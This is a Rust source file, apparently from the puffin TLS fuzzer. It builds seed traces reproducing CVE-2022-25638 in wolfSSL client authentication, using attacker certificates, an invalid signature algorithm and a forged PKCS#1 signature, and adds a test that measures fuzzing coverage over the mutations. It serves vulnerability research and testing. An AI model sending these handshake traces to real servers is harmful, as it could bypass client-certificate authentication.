use std::ops::BitXor;

use itertools::Itertools;
use puffin::{
    agent::{AgentDescriptor, AgentName, AgentType, TLSVersion},
    algebra::{dynamic_function::DescribableFunction, Term},
    fuzzer::sanitizer::libafl_targets::{EDGES_MAP, MAX_EDGES_NUM},
    put::PutOptions,
    term,
    trace::{Action, InputAction, Step, Trace},
};

use crate::{
    put_registry::TLS_PUT_REGISTRY,
    query::TlsQueryMatcher,
    tls::{fn_impl::*, trace_helper::TraceHelper},
};

pub fn seed_cve_2022_25638_fn_eve_cert(server: AgentName) -> Trace<TlsQueryMatcher> {
    let client_hello = term! {
          fn_client_hello(
            fn_protocol_version12,
            fn_new_random,
            fn_new_session_id,
            (fn_append_cipher_suite(
                (fn_new_cipher_suites()),
                fn_cipher_suite13_aes_128_gcm_sha256
            )),
            fn_compressions,
            (fn_client_extensions_append(
                (fn_client_extensions_append(
                    (fn_client_extensions_append(
                        (fn_client_extensions_append(
                            fn_client_extensions_new,
                            (fn_support_group_extension(fn_named_group_secp384r1))
                        )),
                        fn_signature_algorithm_extension
                    )),
                    (fn_key_share_deterministic_extension(fn_named_group_secp384r1))
                )),
                fn_supported_versions13_extension
            ))
        )
    };

    // ApplicationData 0 is EncryptedExtensions
    let certificate_request_message = term! {
        fn_decrypt_handshake(
            ((server, 1)[Some(TlsQueryMatcher::ApplicationData)]), // Ticket from last session
            (fn_server_hello_transcript(((server, 0)))),
            (fn_get_server_key_share(((server, 0)))),
            fn_no_psk,
            fn_named_group_secp384r1,
            fn_true,
            fn_seq_1
        )
    };

    let certificate_rsa = term! {
        fn_certificate13(
            (fn_get_context((@certificate_request_message))),
            //fn_empty_certificate_chain
            // Or append eve cert
            (fn_append_certificate_entry(
                (fn_certificate_entry(
                    fn_eve_cert
                )),
              fn_empty_certificate_chain
            ))
        )
    };

    let certificate_verify_rsa = term! {
        fn_certificate_verify(
            fn_rsa_pss_signature_algorithm,
            (fn_rsa_sign_client(
                (fn_certificate_transcript(((server, 0)))),
                fn_bob_key,
                fn_rsa_pss_signature_algorithm
            ))
        )
    };

    let client_finished = term! {
        fn_finished(
            (fn_verify_data(
                (fn_server_finished_transcript(((server, 0)))),
                (fn_server_hello_transcript(((server, 0)))),
                (fn_get_server_key_share(((server, 0)))),
                fn_no_psk,
                fn_named_group_secp384r1
            ))
        )
    };

    let trace = Trace {
        prior_traces: vec![],
        descriptors: vec![AgentDescriptor {
            name: server,
            tls_version: TLSVersion::V1_3,
            typ: AgentType::Server,
            client_authentication: true,
            ..AgentDescriptor::default()
        }],
        steps: vec![
            Step {
                agent: server,
                action: Action::Input(InputAction {
                    recipe: term! {
                        @client_hello
                    },
                }),
            },
            Step {
                agent: server,
                action: Action::Input(InputAction {
                    recipe: term! {
                        fn_encrypt_handshake(
                            (@certificate_rsa),
                            (fn_server_hello_transcript(((server, 0)))),
                            (fn_get_server_key_share(((server, 0)))),
                            fn_no_psk,
                            fn_named_group_secp384r1,
                            fn_true,
                            fn_seq_0  // sequence 0
                        )
                    },
                }),
            },
            Step {
                agent: server,
                action: Action::Input(InputAction {
                    recipe: term! {
                         fn_encrypt_handshake(
                            (@certificate_verify_rsa),
                            (fn_server_hello_transcript(((server, 0)))),
                            (fn_get_server_key_share(((server, 0)))),
                            fn_no_psk,
                            fn_named_group_secp384r1,
                            fn_true,
                            fn_seq_1  // sequence 1
                        )
                    },
                }),
            },
            Step {
                agent: server,
                action: Action::Input(InputAction {
                    recipe: term! {
                        fn_encrypt_handshake(
                            (@client_finished),
                            (fn_server_hello_transcript(((server, 0)))),
                            (fn_get_server_key_share(((server, 0)))),
                            fn_no_psk,
                            fn_named_group_secp384r1,
                            fn_true,
                            fn_seq_2  // sequence 2
                        )
                    },
                }),
            },
        ],
    };

    trace
}

pub fn seed_cve_2022_25638_fn_invalid_signature_algorithm(
    server: AgentName,
) -> Trace<TlsQueryMatcher> {
    let client_hello = term! {
          fn_client_hello(
            fn_protocol_version12,
            fn_new_random,
            fn_new_session_id,
            (fn_append_cipher_suite(
                (fn_new_cipher_suites()),
                fn_cipher_suite13_aes_128_gcm_sha256
            )),
            fn_compressions,
            (fn_client_extensions_append(
                (fn_client_extensions_append(
                    (fn_client_extensions_append(
                        (fn_client_extensions_append(
                            fn_client_extensions_new,
                            (fn_support_group_extension(fn_named_group_secp384r1))
                        )),
                        fn_signature_algorithm_extension
                    )),
                    (fn_key_share_deterministic_extension(fn_named_group_secp384r1))
                )),
                fn_supported_versions13_extension
            ))
        )
    };

    // ApplicationData 0 is EncryptedExtensions
    let certificate_request_message = term! {
        fn_decrypt_handshake(
            ((server, 1)[Some(TlsQueryMatcher::ApplicationData)]), // Ticket from last session
            (fn_server_hello_transcript(((server, 0)))),
            (fn_get_server_key_share(((server, 0)))),
            fn_no_psk,
            fn_named_group_secp384r1,
            fn_true,
            fn_seq_1
        )
    };

    let certificate_rsa = term! {
        fn_certificate13(
            (fn_get_context((@certificate_request_message))),
            //fn_empty_certificate_chain
            // Or append eve cert
            (fn_append_certificate_entry(
                (fn_certificate_entry(
                    fn_bob_cert
                )),
              fn_empty_certificate_chain
            ))
        )
    };

    let certificate_verify_rsa = term! {
        fn_certificate_verify(
            fn_invalid_signature_algorithm,
            (fn_rsa_sign_client(
                (fn_certificate_transcript(((server, 0)))),
                fn_bob_key,
                fn_rsa_pss_signature_algorithm
            ))
        )
    };

    let client_finished = term! {
        fn_finished(
            (fn_verify_data(
                (fn_server_finished_transcript(((server, 0)))),
                (fn_server_hello_transcript(((server, 0)))),
                (fn_get_server_key_share(((server, 0)))),
                fn_no_psk,
                fn_named_group_secp384r1
            ))
        )
    };

    let trace = Trace {
        prior_traces: vec![],
        descriptors: vec![AgentDescriptor {
            name: server,
            tls_version: TLSVersion::V1_3,
            typ: AgentType::Server,
            client_authentication: true,
            ..AgentDescriptor::default()
        }],
        steps: vec![
            Step {
                agent: server,
                action: Action::Input(InputAction {
                    recipe: term! {
                        @client_hello
                    },
                }),
            },
            Step {
                agent: server,
                action: Action::Input(InputAction {
                    recipe: term! {
                        fn_encrypt_handshake(
                            (@certificate_rsa),
                            (fn_server_hello_transcript(((server, 0)))),
                            (fn_get_server_key_share(((server, 0)))),
                            fn_no_psk,
                            fn_named_group_secp384r1,
                            fn_true,
                            fn_seq_0  // sequence 0
                        )
                    },
                }),
            },
            Step {
                agent: server,
                action: Action::Input(InputAction {
                    recipe: term! {
                         fn_encrypt_handshake(
                            (@certificate_verify_rsa),
                            (fn_server_hello_transcript(((server, 0)))),
                            (fn_get_server_key_share(((server, 0)))),
                            fn_no_psk,
                            fn_named_group_secp384r1,
                            fn_true,
                            fn_seq_1  // sequence 1
                        )
                    },
                }),
            },
            Step {
                agent: server,
                action: Action::Input(InputAction {
                    recipe: term! {
                        fn_encrypt_handshake(
                            (@client_finished),
                            (fn_server_hello_transcript(((server, 0)))),
                            (fn_get_server_key_share(((server, 0)))),
                            fn_no_psk,
                            fn_named_group_secp384r1,
                            fn_true,
                            fn_seq_2  // sequence 2
                        )
                    },
                }),
            },
        ],
    };

    trace
}

pub fn seed_cve_2022_25638_fn_eve_pkcs1_signature(server: AgentName) -> Trace<TlsQueryMatcher> {
    let client_hello = term! {
          fn_client_hello(
            fn_protocol_version12,
            fn_new_random,
            fn_new_session_id,
            (fn_append_cipher_suite(
                (fn_new_cipher_suites()),
                fn_cipher_suite13_aes_128_gcm_sha256
            )),
            fn_compressions,
            (fn_client_extensions_append(
                (fn_client_extensions_append(
                    (fn_client_extensions_append(
                        (fn_client_extensions_append(
                            fn_client_extensions_new,
                            (fn_support_group_extension(fn_named_group_secp384r1))
                        )),
                        fn_signature_algorithm_extension
                    )),
                    (fn_key_share_deterministic_extension(fn_named_group_secp384r1))
                )),
                fn_supported_versions13_extension
            ))
        )
    };

    // ApplicationData 0 is EncryptedExtensions
    let certificate_request_message = term! {
        fn_decrypt_handshake(
            ((server, 1)[Some(TlsQueryMatcher::ApplicationData)]), // Ticket from last session
            (fn_server_hello_transcript(((server, 0)))),
            (fn_get_server_key_share(((server, 0)))),
            fn_no_psk,
            fn_named_group_secp384r1,
            fn_true,
            fn_seq_1
        )
    };

    let certificate_rsa = term! {
        fn_certificate13(
            (fn_get_context((@certificate_request_message))),
            //fn_empty_certificate_chain
            // Or append eve cert
            (fn_append_certificate_entry(
                (fn_certificate_entry(
                    fn_bob_cert
                )),
              fn_empty_certificate_chain
            ))
        )
    };

    let certificate_verify_rsa = term! {
        fn_certificate_verify(
            fn_rsa_pss_signature_algorithm,
            fn_eve_pkcs1_signature
        )
    };

    let client_finished = term! {
        fn_finished(
            (fn_verify_data(
                (fn_server_finished_transcript(((server, 0)))),
                (fn_server_hello_transcript(((server, 0)))),
                (fn_get_server_key_share(((server, 0)))),
                fn_no_psk,
                fn_named_group_secp384r1
            ))
        )
    };

    let trace = Trace {
        prior_traces: vec![],
        descriptors: vec![AgentDescriptor {
            name: server,
            tls_version: TLSVersion::V1_3,
            typ: AgentType::Server,
            client_authentication: true,
            ..AgentDescriptor::default()
        }],
        steps: vec![
            Step {
                agent: server,
                action: Action::Input(InputAction {
                    recipe: term! {
                        @client_hello
                    },
                }),
            },
            Step {
                agent: server,
                action: Action::Input(InputAction {
                    recipe: term! {
                        fn_encrypt_handshake(
                            (@certificate_rsa),
                            (fn_server_hello_transcript(((server, 0)))),
                            (fn_get_server_key_share(((server, 0)))),
                            fn_no_psk,
                            fn_named_group_secp384r1,
                            fn_true,
                            fn_seq_0  // sequence 0
                        )
                    },
                }),
            },
            Step {
                agent: server,
                action: Action::Input(InputAction {
                    recipe: term! {
                         fn_encrypt_handshake(
                            (@certificate_verify_rsa),
                            (fn_server_hello_transcript(((server, 0)))),
                            (fn_get_server_key_share(((server, 0)))),
                            fn_no_psk,
                            fn_named_group_secp384r1,
                            fn_true,
                            fn_seq_1  // sequence 1
                        )
                    },
                }),
            },
            Step {
                agent: server,
                action: Action::Input(InputAction {
                    recipe: term! {
                        fn_encrypt_handshake(
                            (@client_finished),
                            (fn_server_hello_transcript(((server, 0)))),
                            (fn_get_server_key_share(((server, 0)))),
                            fn_no_psk,
                            fn_named_group_secp384r1,
                            fn_true,
                            fn_seq_2  // sequence 2
                        )
                    },
                }),
            },
        ],
    };

    trace
}

pub fn seed_client_attacker_auth(server: AgentName) -> Trace<TlsQueryMatcher> {
    let client_hello = term! {
          fn_client_hello(
            fn_protocol_version12,
            fn_new_random,
            fn_new_session_id,
            (fn_append_cipher_suite(
                (fn_new_cipher_suites()),
                fn_cipher_suite13_aes_128_gcm_sha256
            )),
            fn_compressions,
            (fn_client_extensions_append(
                (fn_client_extensions_append(
                    (fn_client_extensions_append(
                        (fn_client_extensions_append(
                            fn_client_extensions_new,
                            (fn_support_group_extension(fn_named_group_secp384r1))
                        )),
                        fn_signature_algorithm_extension
                    )),
                    (fn_key_share_deterministic_extension(fn_named_group_secp384r1))
                )),
                fn_supported_versions13_extension
            ))
        )
    };

    /*let encrypted_extensions = term! {
        fn_decrypt_handshake(
            ((server, 0)[Some(TlsQueryMatcher::ApplicationData)]), // Ticket from last session
            (fn_server_hello_transcript(((server, 0)))),
            (fn_get_server_key_share(((server, 0)))),
            fn_no_psk,
            fn_named_group_secp384r1,
            fn_true,
            fn_seq_0
        )
    };*/

    // ApplicationData 0 is EncryptedExtensions
    let certificate_request_message = term! {
        fn_decrypt_handshake(
            ((server, 1)[Some(TlsQueryMatcher::ApplicationData)]), // Ticket from last session
            (fn_server_hello_transcript(((server, 0)))),
            (fn_get_server_key_share(((server, 0)))),
            fn_no_psk,
            fn_named_group_secp384r1,
            fn_true,
            fn_seq_1
        )
    };

    let certificate = term! {
        fn_certificate13(
            (fn_get_context((@certificate_request_message))),
            (fn_append_certificate_entry(
                (fn_certificate_entry(
                    fn_bob_cert
                )),
              fn_empty_certificate_chain
            ))
        )
    };

    let certificate_verify = term! {
        fn_certificate_verify(
            fn_rsa_pss_signature_algorithm,
            (fn_rsa_sign_client(
                (fn_certificate_transcript(((server, 0)))),
                fn_bob_key,
                fn_rsa_pss_signature_algorithm
            ))
        )
    };

    let client_finished = term! {
        fn_finished(
            (fn_verify_data(
                (fn_server_finished_transcript(((server, 0)))),
                (fn_server_hello_transcript(((server, 0)))),
                (fn_get_server_key_share(((server, 0)))),
                fn_no_psk,
                fn_named_group_secp384r1
            ))
        )
    };

    let trace = Trace {
        prior_traces: vec![],
        descriptors: vec![AgentDescriptor {
            name: server,
            tls_version: TLSVersion::V1_3,
            typ: AgentType::Server,
            client_authentication: true,
            ..AgentDescriptor::default()
        }],
        steps: vec![
            Step {
                agent: server,
                action: Action::Input(InputAction {
                    recipe: term! {
                        @client_hello
                    },
                }),
            },
            Step {
                agent: server,
                action: Action::Input(InputAction {
                    recipe: term! {
                        fn_encrypt_handshake(
                            (@certificate),
                            (fn_server_hello_transcript(((server, 0)))),
                            (fn_get_server_key_share(((server, 0)))),
                            fn_no_psk,
                            fn_named_group_secp384r1,
                            fn_true,
                            fn_seq_0  // sequence 0
                        )
                    },
                }),
            },
            Step {
                agent: server,
                action: Action::Input(InputAction {
                    recipe: term! {
                         fn_encrypt_handshake(
                            (@certificate_verify),
                            (fn_server_hello_transcript(((server, 0)))),
                            (fn_get_server_key_share(((server, 0)))),
                            fn_no_psk,
                            fn_named_group_secp384r1,
                            fn_true,
                            fn_seq_1  // sequence 1
                        )
                    },
                }),
            },
            Step {
                agent: server,
                action: Action::Input(InputAction {
                    recipe: term! {
                        fn_encrypt_handshake(
                            (@client_finished),
                            (fn_server_hello_transcript(((server, 0)))),
                            (fn_get_server_key_share(((server, 0)))),
                            fn_no_psk,
                            fn_named_group_secp384r1,
                            fn_true,
                            fn_seq_2  // sequence 2
                        )
                    },
                }),
            },
        ],
    };

    trace
}

fn mutate_fn_eve_cert(trace: &mut Trace<TlsQueryMatcher>) {
    let certificate = trace.steps.get_mut(1).unwrap();
    match &mut certificate.action {
        Action::Input(input) => match &mut input.recipe {
            Term::Variable(_) => {}
            Term::Application(_, subterms) => match subterms.get_mut(0).unwrap() {
                Term::Variable(_) => {}
                Term::Application(_, subterms) => match subterms.get_mut(1).unwrap() {
                    Term::Variable(_) => {}
                    Term::Application(_, subterms) => match subterms.get_mut(0).unwrap() {
                        Term::Variable(_) => {}
                        Term::Application(_, subterms) => {
                            let eve = subterms.get_mut(0).unwrap();
                            println!("\t{}", eve.name());
                            eve.mutate(term! {
                                fn_eve_cert
                            })
                        }
                    },
                },
            },
        },
        Action::Output(_) => {}
    }
}

fn mutate_fn_invalid_signature_algorithm(trace: &mut Trace<TlsQueryMatcher>) {
    let certificate_verify = trace.steps.get_mut(1).unwrap();
    match &mut certificate_verify.action {
        Action::Input(input) => match &mut input.recipe {
            Term::Variable(_) => {}
            Term::Application(_, subterms) => match subterms.get_mut(0).unwrap() {
                Term::Variable(_) => {}
                Term::Application(_, subterms) => {
                    let eve = subterms.get_mut(0).unwrap();
                    println!("\t{}", eve.name());
                    eve.mutate(term! {
                        fn_invalid_signature_algorithm
                    })
                }
            },
        },
        Action::Output(_) => {}
    }
}

fn mutate_fn_eve_pkcs1_signature(trace: &mut Trace<TlsQueryMatcher>) {
    let certificate_verify = trace.steps.get_mut(2).unwrap();
    match &mut certificate_verify.action {
        Action::Input(input) => match &mut input.recipe {
            Term::Variable(_) => {}
            Term::Application(_, subterms) => match subterms.get_mut(0).unwrap() {
                Term::Variable(_) => {}
                Term::Application(_, subterms) => {
                    let eve = subterms.get_mut(1).unwrap();
                    println!("\t{}", eve.name());
                    eve.mutate(term! {
                        fn_eve_pkcs1_signature
                    })
                }
            },
        },
        Action::Output(_) => {}
    }
}

#[test]
#[cfg(feature = "wolfssl510")]
#[cfg(feature = "tls13")] // require version which supports TLS 1.3
#[cfg(feature = "client-authentication-transcript-extraction")]
//#[cfg(not(feature = "fix-CVE-2022-25638"))]
#[ignore]
fn test_seed_cve_2022_25638_coveragetest() {
    fn reset_hitcount() {
        unsafe {
            for i in 0..MAX_EDGES_NUM {
                EDGES_MAP[i] = 0;
            }
        }
    }
    fn hitcount() -> usize {
        unsafe {
            EDGES_MAP[0..MAX_EDGES_NUM]
                .iter()
                .map(|n| *n as u64)
                .filter(|n| *n != 0)
                .count()
        }
    }

    fn coverage_hash() -> u64 {
        unsafe {
            const K: u64 = 0x517cc1b727220a95;

            EDGES_MAP[0..MAX_EDGES_NUM]
                .iter()
                .map(|n| *n as u64)
                .reduce(|acc, n| acc.rotate_left(5).bitxor(n).wrapping_mul(K))
                .unwrap()
        }
    }

    let items: [(&'static str, fn(&mut Trace<TlsQueryMatcher>)); 3] = [
        ("cert_eve", mutate_fn_eve_cert),
        (
            "invalid_signature_algorithm",
            mutate_fn_invalid_signature_algorithm,
        ),
        ("eve_pkcs1_signature", mutate_fn_eve_pkcs1_signature),
    ];

    let mut all_hitcounts = vec![];
    let mut all_hashes = vec![];

    for (i, perm) in items.iter().permutations(items.len()).enumerate() {
        println!("Permutation: {}", i);
        let mut hitcounts = vec![];
        let mut trace = seed_client_attacker_auth.build_trace();
        for (name, mutator) in perm {
            println!("{}", name);
            mutator(&mut trace);
            trace.execute_deterministic(&TLS_PUT_REGISTRY, PutOptions::default());
            hitcounts.push(hitcount());
        }

        all_hashes.push(coverage_hash());

        reset_hitcount();

        all_hitcounts.push(hitcounts);
    }

    println!("{:?}", all_hitcounts);
    println!("{:?}", all_hashes);
}
